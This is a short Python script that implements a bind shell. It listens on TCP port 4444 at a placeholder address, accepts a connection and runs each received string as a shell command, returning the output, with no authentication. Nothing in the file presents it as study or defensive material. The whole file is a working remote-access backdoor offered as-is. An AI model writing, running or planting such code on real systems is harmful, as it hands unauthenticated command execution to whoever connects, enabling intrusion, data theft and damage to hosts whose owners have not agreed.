import socket
import subprocess

HOST = 'YOUR_IP_HERE'
PORT = 4444

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"Listening on {HOST}:{PORT}...")
    conn, addr = s.accept()
    with conn:
        print(f"Connected by {addr}")
        while True:
            cmd = conn.recv(1024).decode()
            if not cmd:
                break
            if cmd.lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            conn.send(output.encode())
